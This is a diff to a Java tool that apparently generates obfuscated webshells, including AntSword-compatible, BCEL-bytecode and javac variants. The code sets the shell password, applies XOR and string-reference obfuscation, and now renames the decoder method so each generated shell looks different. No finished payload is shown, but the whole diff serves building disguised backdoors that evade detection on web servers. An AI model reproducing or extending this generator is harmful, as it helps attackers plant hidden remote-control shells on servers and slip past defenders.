@@ -6,6 +6,7 @@ import com.github.javaparser.ast.body.ConstructorDeclaration;
 import com.github.javaparser.ast.body.MethodDeclaration;
 import com.github.javaparser.ast.body.VariableDeclarator;
 import com.github.javaparser.ast.expr.ArrayInitializerExpr;
+import com.github.javaparser.ast.expr.MethodCallExpr;
 import com.github.javaparser.ast.expr.StringLiteralExpr;
 import com.github.javaparser.ast.type.ClassOrInterfaceType;
 import com.sun.org.apache.bcel.internal.classfile.Utility;
@@ -102,7 +103,7 @@ public class Application {
     }
 
     public static void doProxyAsm(Command command) throws IOException {
-        Base.asmBase(command, "Asm.java", false);
+        Base.asmBase(command, "ProxyAsm.java", false);
     }
 
     public static void doBcelAsm(Command command) throws IOException {
@@ -131,8 +132,8 @@ public class Application {
                 sles.get(1).setValue(byteCode);
             }
         }
-        Base.normalOperate(bcelMethod);
-        Base.decCodeOperate(decMethod);
+        String newDecName = Base.decCodeOperate(decMethod);
+        Base.normalOperate(bcelMethod, newDecName);
         WriteUtil.write(bcelMethod, decMethod, command.password, command.unicode, command.output);
         logger.info("finish");
     }
@@ -161,8 +162,8 @@ public class Application {
         if (javacMethod == null || decMethod == null) {
             return;
         }
-        Base.normalOperate(javacMethod);
-        Base.decCodeOperate(decMethod);
+        String newDecName = Base.decCodeOperate(decMethod);
+        Base.normalOperate(javacMethod, newDecName);
         WriteUtil.writeJavac(javacMethod, decMethod, command.password, command.unicode, command.output);
         logger.info("finish");
     }
@@ -182,13 +183,11 @@ public class Application {
         List<ArrayInitializerExpr> arrayExpr = antMethod.findAll(ArrayInitializerExpr.class);
         StringLiteralExpr expr = (StringLiteralExpr) arrayExpr.get(0).getValues().get(1);
         expr.setValue(command.password);
-
         String antClassCode = null;
         String antDecCode;
         String antCode;
         String decCode;
-
-        logger.info("modify ant class");
+        logger.info("generate ant sword class");
         for (ClassOrInterfaceDeclaration c : antClasses) {
             if (!c.getNameAsString().equals("Ant")) {
                 c.setName(antClassName);
@@ -209,8 +208,7 @@ public class Application {
                 antClassCode = c.toString();
             }
         }
-
-        logger.info("modify ant sword base64 method");
+        logger.info("generate ant sword base64 method");
         if (decMethod == null || antDecMethod == null) {
             return;
         }
@@ -218,24 +216,27 @@ public class Application {
         StringModule.changeRef(antDecMethod, offset);
         XORModule.doXOR(antDecMethod);
         XORModule.doXOR(antDecMethod);
-        antDecCode = antDecMethod.toString();
-        logger.info("modify ant sword core code");
+        logger.info("generate ant sword core code");
         antMethod.findAll(ClassOrInterfaceType.class).forEach(ci -> {
             if (ci.getNameAsString().equals("U")) {
                 ci.setName(antClassName);
             }
         });
-        Base.normalOperate(antMethod);
+        String newDecName = Base.decCodeOperate(decMethod);
+        antDecMethod.findAll(MethodCallExpr.class).forEach(mce -> {
+            if (mce.getNameAsString().equals("dec")) {
+                mce.setName(newDecName);
+            }
+        });
+        antDecCode = antDecMethod.toString();
+        Base.normalOperate(antMethod, newDecName);
         String antCodeTmp = antMethod.getBody().isPresent() ?
                 antMethod.getBody().get().toString() : null;
         if (antCodeTmp == null) {
             return;
         }
         antCode = antCodeTmp.substring(1, antCodeTmp.length() - 2);
-        logger.info("modify ant sword decrypt method");
-        Base.decCodeOperate(decMethod);
         decCode = decMethod.toString();
-
         WriteUtil.writeAnt(antClassCode, antCode, antDecCode, decCode, command.output);
         logger.info("finish");
     }
